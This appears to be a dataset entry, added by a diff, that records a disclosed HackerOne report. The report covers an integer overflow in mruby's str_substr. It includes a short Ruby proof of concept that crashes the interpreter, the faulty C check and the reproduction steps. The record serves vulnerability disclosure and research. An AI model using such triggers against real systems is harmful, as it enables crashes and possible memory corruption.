@@ -1,0 +1,46 @@
+{
+  "reported_to": "shopify-scripts",
+  "reported_by": "beyondchain ",
+  "title": "Interger overflow in str_substr leading to read/write out of bound memory",
+  "content": "\nFailed check len & beg in str_substr when call mrb_str_aref_m by String. This can lead to read/write into invalid memory which may be memory corruption or RCE.\nthis snippet causes a crash in mruby(i can't check mruby-engine by error undefined symbol >rb_utf8_str_new ):\nCode 72 Bytes\n1$b=\"B\"*2048\n2$expand=$b[0x40,0x7fffffff]\n3puts $expand.size()\n4puts $expand\nAnd, here is error: beg=0x40, len=0x7fffffff, clen=0x800=> beg+len < clen(Integer Overflow)\nCode 259 Bytes\n1static mrb_value\n2str_substr(mrb_state *mrb, mrb_value str, mrb_int beg, mrb_int len)\n3{\n4/**\n5*..some code here\n6**/\n7if (beg + len > clen) => Integer overflow here\n8    len = clen - beg;\n9  if (len <= 0) {\n10    len = 0;\n11  }\n12  return str_subseq(mrb, str, beg, len);\n13}\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 100,
+  "weaknesses": [
+    "Uncontrolled Resource Consumption"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1489555740,
+  "report_url": "https://hackerone.com/reports/205884",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Create a string 'b' with 2048 'B' characters: $b=\"B\"*2048"
+    ],
+    [
+      2,
+      "Attempt to extract a substring starting at position 0x40 with length 0x7fffffff: $expand=$b[0x40,0x7fffffff]"
+    ],
+    [
+      3,
+      "Print the size of the extracted substring: puts $expand.size()"
+    ],
+    [
+      4,
+      "Print the extracted substring: puts $expand"
+    ]
+  ],
+  "vuln_description": "The vulnerability is an integer overflow in the str_substr function in mruby, which occurs when processing substring operations with large length values. When beg + len exceeds the maximum integer value, it wraps around due to integer overflow, bypassing the length check. This allows reading or writing out of bounds memory, potentially leading to memory corruption or remote code execution.",
+  "reason": "The vulnerability requires understanding of integer overflow conditions in string operations and how to trigger them with specific input values. The attack is straightforward once the overflow condition is known, involving only a few lines of code to trigger the vulnerable path. No complex application state manipulation or novel logic is required.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
